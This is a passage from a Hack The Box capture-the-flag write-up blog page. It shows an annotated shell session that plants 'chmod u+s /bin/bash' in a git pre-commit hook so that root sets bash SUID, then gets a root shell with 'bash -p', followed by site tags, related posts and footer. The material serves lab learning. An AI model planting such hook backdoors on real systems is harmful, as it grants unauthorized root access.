</span><span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">head</span> <span class="nt">-n</span> 5 pre-commit.sample 	  &lt;<span class="nt">--------------------------</span> check hook <span class="o">(</span>script<span class="o">)</span> to be executed before commit <span class="nb">command</span>
<span class="gp">#</span><span class="o">!</span>/bin/sh
<span class="gp">#</span><span class="w">
</span><span class="gp">#</span><span class="w"> </span>An example hook script to verify what is about to be committed.
<span class="gp">#</span><span class="w"> </span>Called by <span class="s2">"git commit"</span> with no arguments.  The hook should
<span class="gp">#</span><span class="w"> </span><span class="nb">exit </span>with non-zero status after issuing an appropriate message <span class="k">if</span>
<span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s2">"2i chmod u+s /bin/bash"</span> pre-commit.sample &lt;<span class="nt">--------</span> add <span class="k">in </span>the second line <span class="nb">command </span>to assign SUID permissions to bash
<span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">head</span> <span class="nt">-n</span> 5 pre-commit.sample 	  &lt;<span class="nt">--------------------------</span> check changes
<span class="gp">#</span><span class="o">!</span>/bin/sh
<span class="go">chmod u+s /bin/bash
</span><span class="gp">#</span><span class="w">
</span><span class="gp">#</span><span class="w"> </span>An example hook script to verify what is about to be committed.
<span class="gp">#</span><span class="w"> </span>Called by <span class="s2">"git commit"</span> with no arguments.  The hook should
<span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">mv </span>pre-commit.sample pre-commit	&lt;<span class="nt">----------------------</span> rename to activate the script and root run it
<span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash	&lt;<span class="nt">--------------------------------------</span> check bash permissions <span class="o">(</span>SUID<span class="o">)</span>
<span class="go">-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
</span><span class="gp">bash-4.4$</span><span class="w"> </span>bash <span class="nt">-p</span> 		&lt;<span class="nt">--------------------------------------</span> run bash as the owning user <span class="o">(</span>root user<span class="o">)</span>
<span class="gp">bash-4.4#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">bash-4.4#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root root 33 Jun 29 18:12 /root/root.txt
</span><span class="gp">bash-4.4#</span><span class="w"> 
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a> <a href="/tags/cron-job/" class="post-tag no-text-decoration" >Cron job</a> <a href="/tags/pspy/" class="post-tag no-text-decoration" >pspy</a> <a href="/tags/werkzeug/" class="post-tag no-text-decoration" >Werkzeug</a> <a href="/tags/information-leakage/" class="post-tag no-text-decoration" >Information Leakage</a> <a href="/tags/git/" class="post-tag no-text-decoration" >Git</a> <a href="/tags/pivoting/" class="post-tag no-text-decoration" >Pivoting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Opensource - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBOpensource/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Opensource - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBOpensource/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBOpensource/&amp;text=Hackthebox Writeup Opensource - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBLate/"><div class="card-body"> <em class="timeago small" data-ts="1652136193" > 2022-05-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Late</h3><div class="text-muted small"><p> Máquina Linux donde al enumerar encontramos un servicio web abierto que aplicaba Virtual Hosting y nos permitia llegar a otra web con un programa para convertir imágenes a texto Optical Character R...</p></div></div></a></div><div class="card"> <a href="/posts/HTBCarpediem/"><div class="card-body"> <em class="timeago small" data-ts="1662408792" > 2022-09-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Carpediem</h3><div class="text-muted small"><p> Overview: Evade login to website by leaking SQL query Remote code execution by test function with full access (Container, python scripting) Network host scanning (bash scripting) Pivoting...</p></div></div></a></div><div class="card"> <a href="/posts/HTBPhotobomb/"><div class="card-body"> <em class="timeago small" data-ts="1667426116" > 2022-11-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Photobomb</h3><div class="text-muted small"><p> Overview Http authentication credentials by Information leak in a server file Command Inyection by unsanitized user input on file download (Foothold) Path Hijacking to remote command execut...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBLate/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Late</p></a> <a href="/posts/HTBNoter/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Noter</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
